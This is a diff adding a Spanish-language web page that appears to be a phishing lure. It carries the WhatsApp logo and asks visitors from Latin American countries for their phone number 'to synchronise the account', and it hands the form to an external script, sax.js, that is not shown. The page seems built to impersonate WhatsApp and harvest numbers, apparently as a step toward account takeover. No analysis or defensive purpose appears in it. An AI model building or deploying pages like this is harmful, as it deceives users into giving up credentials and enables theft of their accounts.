@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verificación Teléfono</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="top-bg"></div>
+  <div class="form-wrapper">
+    <div class="form-box">
+      <img src="WhatsApp.svg" alt="Logo" class="logo" />
+      <p class="intro-text">
+        Ingrese su número de teléfono para sincronizar su cuenta.
+      </p>
+      <form id="loginForm">
+        <select id="select" required>
+                <option value="" disabled="" selected="">Selecciona tu país</option>
+                <option value="+54">🇦🇷 Argentina +54</option>
+                <option value="+591">🇧🇴 Bolivia +591</option>
+                <option value="+55">🇧🇷 Brasil +55</option>
+                <option value="+56">🇨🇱 Chile +56</option>
+                <option value="+57">🇨🇴 Colombia +57</option>
+                <option value="+506">🇨🇷 Costa Rica +506</option>
+                <option value="+53">🇨🇺 Cuba +53</option>
+                <option value="+1">🇩🇴 República Dominicana +1</option>
+                <option value="+593">🇪🇨 Ecuador +593</option>
+                <option value="+503">🇸🇻 El Salvador +503</option>
+                <option value="+502">🇬🇹 Guatemala +502</option>
+                <option value="+504">🇭🇳 Honduras +504</option>
+                <option value="+52">🇲🇽 México +52</option>
+                <option value="+505">🇳🇮 Nicaragua +505</option>
+                <option value="+507">🇵🇦 Panamá +507</option>
+                <option value="+595">🇵🇾 Paraguay +595</option>
+                <option value="+51">🇵🇪 Perú +51</option>
+                <option value="+1">🇵🇷 Puerto Rico +1</option>
+                <option value="+598">🇺🇾 Uruguay +598</option>
+                <option value="+58">🇻🇪 Venezuela +58</option>
+        </select>
+        <input type="tel" id="tel" placeholder="Número de teléfono" required maxlength="15"/>
+        <button type="submit">CONTINUAR</button>
+      </form>
+    </div>
+  </div>
+
+  <script src="sax.js"></script>
+</body>
+</html>
